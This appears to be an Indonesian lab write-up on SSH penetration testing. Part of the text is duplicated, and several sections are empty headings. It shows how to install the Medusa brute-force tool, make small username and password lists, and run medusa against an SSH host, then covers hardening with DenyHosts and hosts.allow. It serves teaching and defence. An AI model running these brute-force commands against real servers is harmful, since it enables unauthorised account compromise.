# A. Pendahuluan
Uji penetrasi(penetration test) adalah cara yang dapat digunakan unruk mengindentifikasi terentanan yang ada dalam sistem atau jaringan yang sudah memiliki langkah - langkah keamanan sebagai langkah preventif. Sebuah tes penetrasi biasanya melibatkan penggunaan metode yang dilakukan oleh individu yang terpercaya yang sengaja menyerang dengan logika yang sama seperti yang digunakan oleh penyusup dari luar atau hacker.
Tergantung pada jenis tes yang dilakukan, ini mungkin saja hanya melibatkan pemindaian sederhana sebuah alamat IP untuk mengidentifikasi mesin yang sedang beroperasi(live) atau dengan desain yang lebih tajam misalnya mengambil akases root/admin. Hasil penetration test ini atau serangan ini kemudian didokumentasikan dan disajikan sebagai laporan kepada pemilik sistem dan kerentanan diidentifikasi kemudian dapat diselesaikan

# B. Dasar Teori

# Uji Penetrasi 1

## Langkah Instalasi Ubuntu Server

## Langkah Instalasi Kali Linux

## Langkah Instalasi SSH Server (OpenSSH)

Instalasi OpenSSH pada Ubuntu Server memanfaatkan package yang telah disediakan linux dengan melakukan get package maka OpenSSH akan terinstall pada Ubuntu Server

```
sudo apt-get install openssh-server

```

Dengan memsukkan syntax diatas ke dalam terminal pada Ubuntu Server maka OpenSSH akan terinstall dengan pengaturan default

Untuk menjalankan OpenSSH dilakukan cara

```
sudo service ssh start
```

## Langkah Instalasi SSH Brute Force Tools (Medusa)

## Langkah Uji Penetrasi dengan SSH Brute Force Tools

# D. Uji Penetrasi 2

### 1. Langkah Konfigurasi DenyHosts

### 2. Langkah Konfigurasi SSH Server

### 3. Langkah Uji Penetrasi dengan SSH Brute Force Tools

=======
# A. Pendahuluan

# B. Dasar Teori

# Uji Penetrasi 1

## 1. Langkah Instalasi Ubuntu Server

## 2. Langkah Instalasi Kali Linux

## 3. Langkah Instalasi SSH Server (OpenSSH)

Instalasi OpenSSH pada Ubuntu Server memanfaatkan package yang telah disediakan linux dengan melakukan get package maka OpenSSH akan terinstall pada Ubuntu Server

```
sudo apt-get install openssh-server
```

Dengan memsukkan syntax diatas ke dalam terminal pada Ubuntu Server maka OpenSSH akan terinstall dengan pengaturan default

Untuk menjalankan OpenSSH dilakukan cara

```
sudo service ssh start
```

## 4. Langkah Instalasi SSH Brute Force Tools (Medusa)

Untuk melakukan brute force pada sebuah server dibutuhkan SSH Brute Force Tools, terdapat berbagai macam tools yang bisa digunakan diantaranya adalah Hydra, Ncrack, Medusa, dll.

Tools tersebut memiliki tujuan yang sama yaitu melakukan brute force pada sebuah server dengan memiliki daftar percobaan username serta password untuk dilakukan login secara brute force sehingga bisa didapatkan username serta password yang digunakan.

Cara melakukan penginstallan pada kali linux pun sama dalam melakukan penginstallan aplikasi lainnya pada sebuah OS Linux, yaitu melakukan get package pada server ubuntu  dengan syntax.

```
sudo apt-get install build-essential make patch subversion openssl libssl-dev libpq-dev libgcrypt11-dev libgnutls-dev libsvn-dev zlib1g-dev libssh2-1-dev libnl-dev gettext autoconf tcl8.5 libpcap0.8-dev python-scapy python-dev cracklib-runtime macchanger-gtk tshark ethtool
```

Namun biasanya pada Kali Linux telah terinstall Brute Force Tools seperti medusa sehingga tidak perlu melakukan get package, namun bila tidak menggunakan Kali Linux bisa menggunakan syntax diatas atau dengan mendownload tar medusa dengan cara dibawah ini.

```
sudo wget http://www.foofus.net/jmk/tools/medusa-2.1.1.tar.gz -O – | sudo tar -xvz
```

```
cd medusa*
```

```
./configure
```

```
sudo make && sudo make install
```

Dengan kedua cara diatas maka Brute Force Tools Medusa akan terinstall pada Linux.

## 5. Langkah Uji Penetrasi dengan SSH Brute Force Tools

Untuk melakukan serangan secara brute force terhadap sebuah server menggunakan tools medusa diharuskan memiliki daftar username serta password untuk dicoba secara brute force sampai didapatkan username dan password yang cocok.

Langkah awal dibuat terlebih dahulu daftar username untuk dicoba

```
cat > username.txt
```

Setelah syntax diatas dijalankan maka user tinggal memasukkan daftar username yang ingin dicoba diantaranya adalah

```
aloha
admin
root
toor
administrator
ubuntuserver
```

Selanjutnya dibuatkan daftar password yang akan dicoba

```
cat > password.txt
```

Setelah syntax diatas dijalankan maka user tinggal memasukkan daftar password yang ingin dicoba diantaranya adalah

```
admin
administrator
root
toor
tes
qwerty
```

Setelah membuat daftar username serta password yang akan digunakan dalam melakukan brute force attack. Attacker pun harus mengetahui ip dari host yang akan di attack, selanjutnya dijalan syntax seperti dibawah ini

```
medusa -h IP HOST -U username.txt -P password.txt -M ssh
```

Syntax yang digunakan bisa seperti diatas apabila attacker memiliki daftar username serta password, namun bila attacker ingin mencoba melakukan attack dengan menggunakan satu username serta satu password bisa menggunakan syntax 

```
medusa -h IP HOST -u "admin" -p "admin" -M ssh
```

Dengan syntax diatas maka attacker melakukan attack dengan mencoba username admin serta password admin

Apabilan berhasil maka medusa akan memberikan feedback berupa username dan password yang digunakan oleh server seperti gambar dibawah ini

# D. Uji Penetrasi 2

### 1. Langkah Konfigurasi DenyHosts

Ubuntu server harus menginstall DenyHosts terlebih dahulu dengan syntax 

```
sudo apt-get install denyhosts
```

Selain langkah diatas dapat dilakukan dengan cara

```
cd /tmp/ && wget http://downloads.sourceforge.net/project/denyhost/denyhost-2.8/denyhosts-2.8.tar.gz
```

```
tar xzf denyhosts*.tar.gz
```

```
cd DenyHosts*
```

```
sudo python setup.py install
```

```
sudo cp /usr/local/bin/daemon-control-dist /etc/init.d/denyhosts
```

Setelah DenyHosts terinstall maka perlu dilakukan konfigurasi terlebih dahulu dengan merubah denyhosts bin dengan cara

```
sudo vi /etc/init.d/denyhosts
```

Rubah file tersebut seperti dibawah

```
###############################################
#### Edit these to suit your configuration ####
###############################################

DENYHOSTS_BIN = “/usr/local/bin/denyhosts.py”
DENYHOSTS_LOCK = “/run/denyhosts.pid”
DENYHOSTS_CFG = “/etc/denyhosts.conf”

PYTHON_BIN = “/usr/bin/env python”
```

User dapat menambahkan hosts yang diizinkan untuk melakukan login terhadap server dengan cara

```
sudo vi /etc/hosts.allow
```

Lalu tambahkan IP pada bagian paling bawah

```
# /etc/hosts.allow: list of hosts that are allowed to access the system.

# See the manual pages hosts_access(5) and hosts_options(5).
#
# Example: ALL: LOCAL @some_netgroup
# ALL: .foobar.edu EXCEPT terminalserver.foobar.edu
#
# If you’re going to protect the portmapper use the name “rpcbind” for the
# daemon name. See rpcbind(8) and rpc.mountd(8) for further information.
#

sshd: 172.145.33.45 
```

Bila user tidak menambahkan hosts yang diperbolehkan maka DenyHosts memperbolehkan IP dalam subnet mask yang sama pada server untuk memperbolehkan host mengaksers server

### 2. Langkah Konfigurasi SSH Server

### 3. Langkah Uji Penetrasi dengan SSH Brute Force Tools

# E. Kesimpulan dan Saran